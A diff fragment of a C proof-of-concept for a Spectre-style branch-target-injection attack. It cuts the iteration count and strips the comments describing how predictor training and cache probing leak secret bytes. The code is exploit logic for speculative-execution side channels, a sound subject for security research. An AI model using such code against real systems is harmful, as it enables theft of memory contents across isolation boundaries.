@@ -16,7 +16,7 @@
 #define CACHELINE_SIZE 64
 #endif
 #ifndef ITERS
-#define ITERS 10000
+#define ITERS 100
 #endif
 #ifndef TRAIN_REPS
 #define TRAIN_REPS 512
@@ -151,18 +151,8 @@ int main() {
         leak_ptr = secret + byte;
 
         for (int i = 0; i < ITERS; ++i) {
-            // Flush probe buf BEFORE training so training touches train_buf
-            // only; the victim iteration is the only chance to heat probe_buf.
             flush_buffer(probe_buf, PAGE_SIZE * NUM_PAGES);
 
-            // TRAIN_REPS training iterations (v=0) followed by 1 victim
-            // iteration (v=1), all sharing the same call instruction so the
-            // predictor's path history matches between the two.
-            //
-            // Training sets the in-memory target to final_gadget and uses
-            // train_buf. The victim sets the in-memory target to
-            // final_legitimate and uses probe_buf, so a probe_buf hit should
-            // come from speculative execution of final_gadget.
             for (int j = 0; j <= TRAIN_REPS; ++j) {
                 int v = (j == TRAIN_REPS);
                 funcs[ARRAY_SIZE - 1] = final_choices[v];
